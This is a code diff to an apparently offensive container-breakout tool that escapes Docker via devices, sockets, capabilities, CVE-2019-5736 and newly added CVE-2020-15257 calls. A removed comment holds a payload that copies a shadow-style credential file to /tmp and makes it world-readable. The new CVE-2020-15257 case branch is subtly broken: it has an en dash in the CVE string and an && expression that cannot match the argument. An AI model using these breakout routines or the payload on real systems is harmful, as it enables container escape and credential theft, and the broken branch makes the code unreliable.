@@ -7,8 +7,6 @@ require "docker"
 def main
   logo()
   #user_namespace_enabled=false  
-  # cve_2019_5736("#!/bin/bash \n cat /etc/shadow3 > /tmp/shadow3 && chmod 777 /tmp/shadow3")
-
   if ARGV.size>0 
     case ARGV[0].to_s
       when "check"
@@ -27,11 +25,13 @@ def main
         if ARGV.size > 1
           payload = ARGV[1]
           puts(payload)
-          cve_2019_5736(payload)
+          attempt_cve_2019_5736(payload)
         else
           puts("No payload supplied.")
           exit(1)
         end
+      when "cve-2020–15257" && cve_2020_15257_check()
+          attempt_cve_2020_15257()
       else
         usage()
     end
@@ -45,11 +45,11 @@ def auto
   puts("\n================================================")
   puts("======= Start common breakout techniques =======")
   puts("================================================")
-  
   attempt_device_breakout()
   attempt_unix_socket_breakout()
   attempt_network_socket_breakout()
   attempt_capability_breakout()
+  attempt_cve_2020_15257_breakout()
 end
 
 def attempt_device_breakout()
@@ -79,6 +79,12 @@ def attempt_network_socket_breakout()
       # dump_docker_secrets(host_and_port)
       socket_breakout(host_and_port[0].to_s,host_and_port[1].to_i)
     end
+  end
+end
+
+def attempt_cve_2020_15257_breakout()
+  if cve_2020_15257_check()
+    attempt_cve_2020_15257()
   end
 end
 
